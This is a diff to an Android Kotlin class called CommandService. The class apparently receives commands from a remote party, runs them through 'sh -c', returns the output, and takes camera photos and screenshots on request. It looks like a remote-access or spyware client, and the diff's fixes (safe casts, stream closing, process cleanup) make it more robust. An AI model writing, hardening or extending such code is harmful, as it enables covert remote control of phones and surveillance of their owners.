@@ -93,7 +93,7 @@ class CommandService : Service() {
                 builder.setPeriodic(5 * 60 * 1000L)
             }
                 
-            val scheduler = getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
+            val scheduler = getSystemService(JOB_SCHEDULER_SERVICE) as? JobScheduler ?: return
             scheduler.schedule(builder.build())
             Log.d(TAG, "JobScheduler scheduled")
         } catch (e: Exception) {
@@ -459,7 +459,7 @@ class CommandService : Service() {
         val cameraId = params?.optString("camera_id", "0") ?: "0"
         serviceScope.launch {
             try {
-                val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                val manager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return@launch
                 val characteristics = manager.getCameraCharacteristics(cameraId)
                 val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                 val largest = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
@@ -572,9 +572,10 @@ class CommandService : Service() {
         serviceScope.launch {
             try {
                 val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
-                val output = process.inputStream.bufferedReader().readText()
-                val error = process.errorStream.bufferedReader().readText()
+                val output = process.inputStream.bufferedReader().use { it.readText() }
+                val error = process.errorStream.bufferedReader().use { it.readText() }
                 process.waitFor()
+                process.destroy()
                 
                 sendResponse("shell_result", JSONObject().apply {
                     put("output", output)
@@ -891,6 +892,7 @@ class CommandService : Service() {
                 val screenshotFile = File(externalCacheDir, "screenshot_${System.currentTimeMillis()}.png")
                 val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", screenshotFile.absolutePath))
                 process.waitFor()
+                process.destroy()
                 
                 if (screenshotFile.exists()) {
                     val bytes = screenshotFile.readBytes()
@@ -1169,9 +1171,10 @@ class CommandService : Service() {
         serviceScope.launch {
             try {
                 val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
-                val output = process.inputStream.bufferedReader().readText()
-                val error = process.errorStream.bufferedReader().readText()
+                val output = process.inputStream.bufferedReader().use { it.readText() }
+                val error = process.errorStream.bufferedReader().use { it.readText() }
                 val exitCode = process.waitFor()
+                process.destroy()
                 
                 sendResponse("shell_output", JSONObject().apply {
                     put("output", output)
@@ -1370,6 +1373,7 @@ class CommandService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        stopForeground(false)
         isConnected = false
         dataSyncManager.persistQueue()
         commandQueue.shutdown()
